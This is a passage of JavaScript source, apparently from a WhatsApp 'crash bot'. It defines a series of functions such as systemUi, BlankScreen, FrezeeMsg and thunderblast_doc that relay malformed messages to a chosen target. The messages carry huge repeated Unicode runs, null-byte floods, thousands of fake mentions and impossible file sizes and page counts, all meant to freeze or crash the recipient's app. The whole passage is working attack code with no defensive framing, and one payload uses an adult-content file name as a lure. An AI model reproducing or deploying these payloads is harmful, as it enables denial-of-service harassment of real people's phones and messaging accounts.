        text: "`ℍα℘𝔓Ꮍ ᥴ𝕽𝐀ꇙհ`\n>  ͆ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺҉ ̺\n" + "ી".repeat(90000),
        contextInfo: {
          mentionedJid: ["62895329013688@s.whatsapp.net", ...Array.from({
            length: 15000
          }, () => "1" + Math.floor(Math.random() * 60000) + "@s.whatsapp.net")],
          stanzaId: "1234567890ABCDEF",
          participant: "62895329013688@s.whatsapp.net",
          quotedMessage: {
            callLogMesssage: {
              isVideo: false,
              callOutcome: "5",
              durationSecs: "999",
              callType: "REGULAR",
              participants: [{
                jid: "62895329013688@s.whatsapp.net",
                callOutcome: "5"
              }]
            }
          },
          remoteJid: target,
          conversionSource: " X ",
          conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJcoregy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3ocoreE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
          conversionDelaySeconds: 10,
          forwardingScore: 10,
          isForwarded: false,
          quotedAd: {
            advertiserName: " X ",
            mediaType: "IMAGE",
            jpegThumbnail: "https://files.catbox.moe/mt818c.jpg",
            caption: " X "
          },
          placeholderKey: {
            remoteJid: "0@s.whatsapp.net",
            fromMe: false,
            id: "ABCDEF1234567890"
          },
          expiration: 86400,
          ephemeralSettingTimestamp: "1728090592378",
          ephemeralSharedSecret: "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
          externalAdReply: {
            title: "‎᭎ᬼᬼᬼৗীি𑍅𑍑\n⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿\n𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿𑇃𑆿𑆿𑇂𑆿𑇂𑆿𑆿᭎ᬼᬼᬼৗীি𑍅𑍑𑆵⾿ါါါ𑍌𑌾𑌿𑈳𑈳𑈳𑈳𑌧𑇂𑆴𑆴𑆴𑆴𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑆵𑇃𑆿",
            body: "ℍα℘𝔓Ꮍ ᥴ𝕽𝐀ꇙհ\n© ᥴ𝕽𝐀ꇙհ",
            mediaType: "VIDEO",
            renderLargerThumbnail: true,
            previewType: "VIDEO",
            thumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/...",
            sourceType: " x ",
            sourceId: " x ",
            sourceUrl: "x",
            mediaUrl: "x",
            containsAutoReply: true,
            showAdAttribution: true,
            ctwaClid: "ctwa_clid_example",
            ref: "ref_example"
          },
          entryPointConversionSource: "entry_point_source_example",
          entryPointConversionApp: "entry_point_app_example",
          entryPointConversionDelaySeconds: 5,
          disappearingMode: {},
          actionLink: {
            url: "‎ ‎ "
          },
          groupSubject: " X ",
          parentGroupJid: "6287888888888-1234567890@g.us",
          trustBannerType: " X ",
          trustBannerAction: 1,
          isSampled: false,
          utm: {
            utmSource: " X ",
            utmCampaign: " X "
          },
          forwardedNewsletterMessageInfo: {
            newsletterJid: "6287888888888-1234567890@g.us",
            serverMessageId: 1,
            newsletterName: " X ",
            contentType: "UPDATE",
            accessibilityText: " X "
          },
          businessMessageForwardInfo: {
            businessOwnerJid: "0@s.whatsapp.net"
          },
          smbClientCampaignId: "smb_client_campaign_id_example",
           smbServerCampaignId: "smb_server_campaign_id_example",
          dataSharingContext: {
            showMmDisclosure: true
          }
        }
      }
    }, Ptcp ? {
      participant: {
        jid: target
      }
    } : {});
console.log(chalk.red.bold('Crash System Device By ☆ sock'))
};
async function systemUi(target, Ptcp = false) {
    sock.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Please.." + "ꦾ".repeat(90000) + "@1".repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "CoDe" }]
                    }
                }
            }
        }
    }, { participant: { jid: target, quoted: m } }, { messageId: null });
};
 async function BlankScreen(target, Ptcp = false) {
let virtex = "Ꝋ𐌌ᏵᏵᏵᏵᏵᏵ\n© PrelXz" + "ྫྷ".repeat(90000) + "@0".repeat(100000);
			await sock.relayMessage(target, {
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "Hayolo",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
									},
									hasMediaAttachment: true,
								},
								body: {
									text: virtex,
								},
								nativeFlowMessage: {
								name: "call_permission_request",
								messageParamsJson: "\u0000".repeat(5000),
								},
								contextInfo: {
								mentionedJid: ["0@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Bokep 18+",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "https://files.catbox.moe/m33kq5.jpg",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: target
					}
				} : {}
			);
            console.log(chalk.red.bold('Olaᥴ𝕽𝐀ꇙհ'))
   	};
   	async function FrezeeMsg1(target) {
            let virtex = "I'AM OKAY :(";
            sock.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                documentMessage: {
                                    url: 'https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true',
                                    mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
                                    fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                    fileLength: "999999999",
                                    pageCount: 0x9184e729fff,
                                    mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdcoreg=",
                                    fileName: virtex,
                                    fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                    directPath: '/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0',
                                    mediaKeyTimestamp: "1715880173",
                                    contactVcard: true
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "I'AM OKAY :(" + "ꦾ".repeat(150000) + "@1".repeat(30000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "ᥴ𝕽𝐀ꇙհ KILLER" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        }
        async function FrezeeMsg2(target) {
            let virtex = "I'AM NOT OKAY :(";
            let memekz = Date.now();
            await sock.relayMessage(target, {
                groupMentionedMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                locationMessage: {
                                    degreesLatitude: -999.03499999999999,
                                    degreesLongitude: 999.03499999999999
                                },
                                hasMediaAttachment: true
                            },
                            body: {
                                text: "I'AM NOT OKAY :(" + "ꦾ".repeat(150000) + "@1".repeat(30000)
                            },
                            nativeFlowMessage: {},
                            contextInfo: {
                                mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                                groupMentions: [{ groupJid: "1@newsletter", groupSubject: "ᥴ𝕽𝐀ꇙհ KILLER" }]
                            }
                        }
                    }
                }
            }, { participant: { jid: target } });
        };
async function buginvite(target, ptcp = true) {
    try {
        const message = {
            botInvokeMessage: {
                message: {
                    newsletterAdminInviteMessage: {
                        newsletterJid: `33333333333333333@newsletter`,
                        newsletterName: "VRL" + "ꦾ".repeat(120000),
                        jpegThumbnail: "",
                        caption: "ꦽ".repeat(120000) + "@0".repeat(120000),
                        inviteExpiration: Date.now() + 1814400000, 
                    },
                },
            },
            nativeFlowMessage: {
    messageParamsJson: "",
    buttons: [
        {
            name: "call_permission_request",
            buttonParamsJson: "{}",
        },
        {
            name: "galaxy_message",
            paramsJson: {
                "screen_2_OptIn_0": true,
                "screen_2_OptIn_1": true,
                "screen_1_Dropdown_0": "nullOnTop",
                "screen_1_DatePicker_1": "1028995200000",
                "screen_1_TextInput_2": "null@gmail.com",
                "screen_1_TextInput_3": "94643116",
                "screen_0_TextInput_0": "\u0000".repeat(500000),
                "screen_0_TextInput_1": "SecretDocu",
                "screen_0_Dropdown_2": "#926-Xnull",
                "screen_0_RadioButtonsGroup_3": "0_true",
                "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s."
            },
        },
    ],
},
                     contextInfo: {
                mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                groupMentions: [
                    {
                        groupJid: "0@s.whatsapp.net",
                        groupSubject: "sockwzz",
                    },
                ],
            },
        };
        await sock.relayMessage(target, message, {
            userJid: target,
        });
    } catch (err) {
        console.error("Error sending newsletter:", err);
    }
}
async function crashUiV5(target, Ptcp = false) {
    sock.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "VRL" + "@0".repeat(250000) + "ꦾ".repeat(100000)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "call_permission_request",
                                buttonParamsJson: {}
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [
                            {
                                groupJid: "0@s.whatsapp.net",
                                groupSubject: "sockwzz"
                            }
                        ]
                    }
                }
            }
        }
    }, { participant: { jid: target }, messageId: null });
};
async function systemUi(target, Ptcp = false) {
    sock.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ꦾ".repeat(250000) + "@0".repeat(100000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "sockwzz" }]
                    }
                }
            }
        }
    }, { participant: { jid: target },  messageId: null });
};
async function systemUi2(target, Ptcp = false) {
    sock.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "ꦾ".repeat(250000) + "@0".repeat(100000)
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "sockwzz",
                        buttons: [
                            {
                                name: "quick_reply",
                                buttonParamsJson: "{\"display_text\":\"sockwzz!\",\"id\":\".groupchat\"}"
                            },
                            {
                                name: "single_select",
                                buttonParamsJson: {
                                    title: "sockwzz",
                                    sections: [
                                        {
                                            title: "sockwzz",
                                            rows: []
                                        }
                                    ]
                                }
                            }
                        ]
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "0@s.whatsapp.net", groupSubject: "sockwzz" }]
                    }
                }
            }
        }
    }, { participant: { jid: target }, messageId: null });
}
	async function crashui2(target, ptcp = false) {
    await sock.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 0,
                            degreesLongitude: 0
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "Wanna With Yours. :D" + "ꦾ".repeat(300000)  + "@1".repeat(300000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: " xCeZeT " }]
                    }
                }
            }
        }
    }, { participant: { jid: target } }, { messageId: null });
}        
        async function thunderblast_doc(target) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: `Undefined`,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "\u0000" + "⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉⃟̸̷⃪݉